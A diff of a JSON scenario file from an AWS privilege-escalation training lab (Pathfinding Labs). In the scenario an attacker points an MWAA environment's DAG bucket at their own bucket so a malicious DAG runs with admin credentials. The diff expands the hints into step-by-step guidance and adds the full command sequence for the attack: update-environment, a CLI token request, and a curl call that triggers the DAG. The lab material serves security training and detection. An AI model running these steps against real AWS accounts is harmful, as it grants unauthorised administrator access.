@@ -1,5 +1,5 @@
 {
-  "displayName": "Privilege Escalation via airflow:UpdateEnvironment",
+  "displayName": "MWAA Environment Update to Admin",
   "name": "mwaa-002-airflow-updateenvironment",
   "description": "Update existing MWAA environment's DAG source bucket to attacker-controlled bucket containing malicious DAG that executes with admin credentials",
   "costEstimate": "$37/mo",
@@ -31,36 +31,42 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/mwaa-002-airflow-updateenvironment"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/mwaa-002-airflow-updateenvironment",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "airflow:UpdateEnvironment",
+        "principal": "pl-prod-mwaa-002-to-admin-starting-user",
         "resource": "arn:aws:airflow:*:*:environment/pl-prod-mwaa-002-to-admin-env",
         "description": "change the DAG source bucket to an attacker-controlled bucket"
       },
       {
         "permission": "airflow:CreateCliToken",
+        "principal": "pl-prod-mwaa-002-to-admin-starting-user",
         "resource": "arn:aws:airflow:*:*:environment/pl-prod-mwaa-002-to-admin-env",
         "description": "obtain a CLI token to trigger DAGs via the Airflow REST API"
       },
       {
         "permission": "ec2:DescribeSubnets",
+        "principal": "pl-prod-mwaa-002-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates these even when not changing network config"
       },
       {
         "permission": "ec2:DescribeVpcs",
+        "principal": "pl-prod-mwaa-002-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates these even when not changing network config"
       },
       {
         "permission": "ec2:DescribeSecurityGroups",
+        "principal": "pl-prod-mwaa-002-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates these even when not changing network config"
       },
       {
         "permission": "s3:GetEncryptionConfiguration",
+        "principal": "pl-prod-mwaa-002-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates bucket encryption settings"
       }
@@ -68,10 +74,12 @@
     "helpful": [
       {
         "permission": "airflow:GetEnvironment",
+        "principal": "pl-prod-mwaa-002-to-admin-starting-user",
         "purpose": "check environment status and wait for update to complete"
       },
       {
         "permission": "iam:ListAttachedUserPolicies",
+        "principal": "pl-prod-mwaa-002-to-admin-starting-user",
         "purpose": "verify that AdministratorAccess was attached after the attack"
       }
     ]
@@ -149,26 +157,26 @@
         "label": "airflow:UpdateEnvironment",
         "description": "Update the MWAA environment's SourceBucketArn to point to an attacker-controlled S3 bucket containing a malicious DAG. Wait 10-30 minutes for the environment update to complete, then 60 seconds for DAG synchronization.\n",
         "hints": [
-          "You can modify the configuration of existing managed workflow environments.",
-          "Look for workflow environments that execute with privileged IAM roles.",
-          "Browse to https://pathfinding.cloud/paths/mwaa-002 for technique details."
+          "Use airflow:GetEnvironment to inspect the target environment -- note the ExecutionRoleArn and the current SourceBucketArn.",
+          "You can change where MWAA looks for DAG files by updating the environment's source bucket configuration.",
+          "You need an S3 bucket that the execution role can read from. Its resource policy must allow the MWAA execution role to read objects.",
+          "Use airflow:UpdateEnvironment to change SourceBucketArn and DagS3Path to point to your attacker-controlled bucket.",
+          "After calling UpdateEnvironment, poll airflow:GetEnvironment until Status returns to AVAILABLE -- this takes 10-30 minutes.",
+          "Once the environment is AVAILABLE, wait an additional 60 seconds for MWAA to discover and parse DAGs from the new bucket location.",
+          "Browse to https://pathfinding.cloud/paths/mwaa-002 for full technique details."
         ],
         "commands": [
           {
+            "description": "Inspect the MWAA environment to confirm its execution role and current DAG source",
+            "command": "aws mwaa get-environment --name pl-prod-mwaa-002-to-admin-env --query 'Environment.{Status:Status,ExecutionRoleArn:ExecutionRoleArn,SourceBucketArn:SourceBucketArn,DagS3Path:DagS3Path}'"
+          },
+          {
             "description": "Update the MWAA environment to use the attacker's bucket",
-            "command": "aws airflow update-environment --name pl-prod-mwaa-002-to-admin-env --source-bucket-arn arn:aws:s3:::pl-mwaa-002-attacker-bucket-{account_id}-{suffix} --dag-s3-path dags/"
+            "command": "aws mwaa update-environment --name pl-prod-mwaa-002-to-admin-env --source-bucket-arn arn:aws:s3:::pl-mwaa-002-attacker-bucket-{account_id}-{suffix} --dag-s3-path dags/"
           },
           {
-            "description": "Wait for the environment update to complete",
-            "command": "aws airflow get-environment --name pl-prod-mwaa-002-to-admin-env --query 'Environment.Status' --output text"
-          },
-          {
-            "description": "Obtain a CLI token to trigger DAGs",
-            "command": "aws airflow create-cli-token --name pl-prod-mwaa-002-to-admin-env"
-          },
-          {
-            "description": "Trigger the malicious DAG via the Airflow CLI API",
-            "command": "curl -X POST 'https://{webserver-hostname}/aws_mwaa/cli' -H 'Authorization: Bearer {cli_token}' -H 'Content-Type: text/plain' -d 'dags trigger privesc_dag'"
+            "description": "Poll until the environment returns to AVAILABLE state",
+            "command": "aws mwaa get-environment --name pl-prod-mwaa-002-to-admin-env --query 'Environment.Status' --output text"
           }
         ]
       },
@@ -178,10 +186,26 @@
         "label": "DAG execution with admin role",
         "description": "The malicious DAG executes within the MWAA environment using the admin execution role's credentials, attaching AdministratorAccess to the starting user.\n",
         "hints": [
-          "This environment's source bucket can be changed to any S3 bucket the execution role can read.",
-          "After the update, any DAG in the new bucket will run with the execution role's permissions."
+          "Once the environment is updated, use airflow:CreateCliToken to obtain a short-lived token for the Airflow web server API.",
+          "The Airflow CLI API endpoint is https://{webserver-hostname}/aws_mwaa/cli -- use the CLI token as a Bearer token to trigger DAGs.",
+          "Trigger the malicious DAG using the dags trigger command via the Airflow CLI API. The DAG will execute as the admin execution role.",
+          "After triggering the DAG, wait ~30 seconds for execution to complete and for IAM policy changes to propagate.",
+          "Use iam:ListAttachedUserPolicies on the starting user to verify that AdministratorAccess has been attached."
         ],
-        "commands": []
+        "commands": [
+          {
+            "description": "Obtain a CLI token to access the Airflow API",
+            "command": "aws mwaa create-cli-token --name pl-prod-mwaa-002-to-admin-env"
+          },
+          {
+            "description": "Trigger the malicious DAG via the Airflow CLI API",
+            "command": "curl -X POST 'https://{webserver-hostname}/aws_mwaa/cli' -H 'Authorization: Bearer {cli_token}' -H 'Content-Type: text/plain' -d 'dags trigger privesc_dag' | base64 -d"
+          },
+          {
+            "description": "Verify that AdministratorAccess was attached to the starting user",
+            "command": "aws iam list-attached-user-policies --user-name pl-prod-mwaa-002-to-admin-starting-user --query 'AttachedPolicies[*].PolicyArn' --output text"
+          }
+        ]
       }
     ]
   },
